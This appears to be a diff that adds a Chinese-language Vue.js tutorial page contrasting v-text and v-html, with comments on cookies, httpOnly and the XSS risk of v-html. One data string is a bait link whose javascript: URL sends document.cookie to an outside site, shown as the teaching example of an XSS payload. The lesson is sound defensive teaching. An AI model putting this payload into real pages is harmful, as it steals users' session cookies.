@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script type="text/javascript" src="../../vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h3>问：{{msg}}</h3>
+        <h3 v-text="test">答：</h3>
+        <h3 v-html="test">答：</h3>
+        <h3 v-html="str"></h3>
+    </div>
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+        const vm = new Vue({
+            el:'#root',
+            data:{
+                msg:'你快乐吗',
+                test:'<h3>我很快乐</h3>',
+                str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
+            },
+        })
+    </script>
+</body>
+</html>
+<!--  
+    v-text 和 v-html 的区别是：
+        v-html 支持结构的解析而 v-text 不支持。
+
+    cookie:
+        cookie 的本质就是字符串，key:value的形式
+        这些cookie就是身份的象征，当再次请求服务器的时候，不需要再输入账号密码，携带这些cookie 经过校验，
+        并且cookie不允许跨浏览器之间去读取
+        插件 Cookie-Editor 可以批量的将所有的cookie导入或者导出。
+        获取网站的所有cookie代码：document.cookie
+        为避免通过上面代码获取到所有的cookie，有一个httpOnly的字段可以限制，如果cookie后面加了httpOnly字段限制，
+            那么这条数据就只有http协议去读取携带。
+
+    v-html指令：
+        1.作用：向指定节点中渲染包含html结构的内容。
+        2.与插值语法的区别：
+            (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+            (2).v-html可以识别html结构。
+        3.严重注意：
+            v-html有安全性问题！！！！
+            (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+            (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+-->
